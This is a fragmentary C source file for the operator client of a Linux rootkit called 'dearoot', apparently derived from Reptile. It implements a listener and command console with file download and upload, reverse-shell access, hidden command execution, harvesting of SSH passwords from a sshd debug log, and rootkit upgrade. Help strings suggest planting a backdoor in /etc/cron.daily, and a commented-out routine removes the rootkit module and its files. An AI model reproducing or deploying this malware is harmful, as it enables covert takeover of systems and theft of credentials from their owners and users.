...
int runcmd(int sock, char** args);
int dear_getpass(int sock, char** args);
int dearoot_upgrade(int sock, char** args);

char *builtin_str[] = {"help", "down", "up", "getshell", "delay", "exit", "runcmd", "getpass", "upgrade"};
int (*builtin_func[])(int sock, char **) = {&help,  &get_file, &put_file,
					    &shell, &delay, &__exit, &runcmd, &dear_getpass, &dearoot_upgrade};
...
void help_download()
{
	...
	fprintf(stdout, "Example: down /etc/passwd /tmp\n");
}

void help_upload()
{
	fprintf(stdout, "%s <file path> <dest dir>\n", builtin_str[2]);
	fprintf(stdout, "Example: up /root/backdoor /etc/cron.daily\n");
}
...
int help(int sock, char **args)
{
	...
	if (args[1] != NULL) {
		...
		fprintf(stdout, "\n\e[01;36mdearoot help manual\e[00m\n");
		fprintf(stdout, "\t%s\t\tshow manual\n", builtin_str[0]);
		fprintf(stdout, "\t%s\t\tdown <target_file> <local_save_path>  \n\t\t\te.g. download /tmp/1.txt /tmp\n", builtin_str[1]);
		fprintf(stdout, "\t%s\t\tup <local_file> <target_save_path> \n\t\t\te.g. upload /tmp/1.txt /tmp\n", builtin_str[2]);
		fprintf(stdout, "\t%s\topen a interactive shell\n", builtin_str[3]);
		fprintf(stdout, "\t%s\t\tset time to reverse shell connect\n", builtin_str[4]);
		fprintf(stdout, "\t%s\t\trun command without output, for backgroud task. e.g. runcmd ping 127.0.0.1\n", builtin_str[6]);
		fprintf(stdout, "\t%s\t\tget target system password by sshd debug\n", builtin_str[7]);
		fprintf(stdout, "\t%s\t\tupgrade rootkit by upgrade.tar\n\t\t\te.g. upgrade /root/upgrade.tar /usr\n", builtin_str[8]);
		fprintf(stdout, "\t%s\t\texit this terminal\n\n", builtin_str[5]);
...
int shell(int sock, char **args)
{
	...
	if (strcmp(args[0], builtin_str[3]) == 0) {
		...
		temp[1] = '\0';
		fprintf(stdout, "\n");
	} else { // only execute cmd , do not reverse shell
		size = 1;
		len = 0;
	...
	for (i = 0; i < num_builtins(); i++) {
		if (strcmp(args[0], builtin_str[i]) == 0) {
			if (i == 0) {
				...
				int flag = 3;
				ret = pel_send_msg(sock, (unsigned char *)&flag, 1);

				if (ret != PEL_SUCCESS) {
					pel_error("pel_send_msg");
					return 1;
				}
				return dear_getpass(sock, args);
			}
			else if ( i == 8 ){ //upgrade
				return dearoot_upgrade(sock, args);
			}
			// else if (i==6){ //upgrade
			// 	i = 2;//first upload 
			// 	ret =
			...
			// 	i = 3; //execute cmd in target system
			...
			// 	int tmp_len = strlen(args[2]);

			// 	pathname = (char *)malloc(tmp_len + strlen(temp) + 2);
			...
			// 	strcpy(pathname, args[2]);
			// 	strcpy(pathname + tmp_len, "/");
			// 	strcpy(pathname + tmp_len + 1, temp);

			// 	char* upgrade_cmd = malloc(512);
			// 	bzero(upgrade_cmd,512);
			// 	sprintf(upgrade_cmd, "nohup sleep 10 && /reptile/reptile_cmd show && rmmod -f reptile_module && rm -rf /reptile /lib/udev/rules.d/*reptile.* /lib/udev/reptile && cd %s && tar xf %s && cd output && ./install.sh 1>/dev/null 2>/dev/null  &", args[2], temp);
			// 	char** upgrade_args = parse(upgrade_cmd);
			// 	free(upgrade_cmd);
			// 	free(pathname);
			// 	(*builtin_func[3])(sock, upgrade_args);
			// 	printf("exit for upgrade, please start again after 30s \n");
			// 	return -1;
			// }
			else {
				ret =
...
int dear_getpass(int sock, char** args)
{
	...
	memset(cmd, '\0', 512);
	sprintf(cmd, "cat %s/.sshd.log | grep Welcome | awk {'print $2'} | sed 's/.$//g' | (xargs -i grep {} %s/.sshd.log  | grep read ) | grep login.defs -B 1 | grep '\\\\0\\\\0' | sort -u", SHELL_DIR, SHELL_DIR);
	char** _cmd = parse(cmd);
	shell(sock, _cmd);
	free(_cmd);
	free(cmd);
...
int dearoot_upgrade(int sock, char** args)
{
	...
	int flag = 2;
	int ret =
		pel_send_msg(sock, (unsigned char *)&flag, 1);
	...
	char* cmd = malloc(170);
	memset(cmd, '\0', 170);
	char* upgrade_tar_file = strrchr(args[1], '/');
	if (upgrade_tar_file != NULL)
		upgrade_tar_file++;
	if (upgrade_tar_file == NULL)
		upgrade_tar_file = args[1];
	sprintf(cmd, "cd %s && tar xf %s && cd output && ./upgrade.sh", args[2], upgrade_tar_file);
	char** _cmd = parse(cmd);
	shell(sock, _cmd);
	free(_cmd);
	free(cmd);
...
{
	if (args[1] == NULL ) {
		fprintf(stdout,"error param\n");
		return 1;
	}

	if (sock==-1){
		fprintf(stdout, "[debug] error: socket loss connection\n");
		return -1;
	}
	...
	char* cmd_temp = (char *)malloc(size);

	if (!cmd_temp) {
		p_error("malloc error");
		return 1;
	}
	...
	while (args[len] != NULL) {
		size++;
		size += strlen(args[len]);
		char *cmd_temp_backup = cmd_temp;
		if ((cmd_temp = realloc(cmd_temp, size)) == NULL) {
			free(cmd_temp_backup);
			p_error("realloc");
			return 1;
		}
		len++;
	...
	memset(cmd_temp, '\0', size);
	int i;
	for (i = 1; i < len; i++) { 
		strcat(cmd_temp, args[i]);
		strcat(cmd_temp, " ");
	}

	len = strlen(cmd_temp);
	int ret;
	ret = pel_send_msg(sock, (unsigned char *)cmd_temp, len);
	free(cmd_temp);
...
void reptile_loop(int sock)
{
	...
	do {
		line = readline("\e[01;32mdearoot> \e[00m");
...
void listener(int port)
{
	...
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &yes, sizeof(int)) ==-1) {  // for port reuse 
		kill(pid, SIGQUIT);
		close(sockfd);
	...
	fprintf(stdout, "%s Activated target ok! \n\n", awesome);
...
int main(int argc, char **argv)
{
	...
	if (password != NULL)
		fprintf(stdout, "%s current dearoot pass: %s\n", good, password);
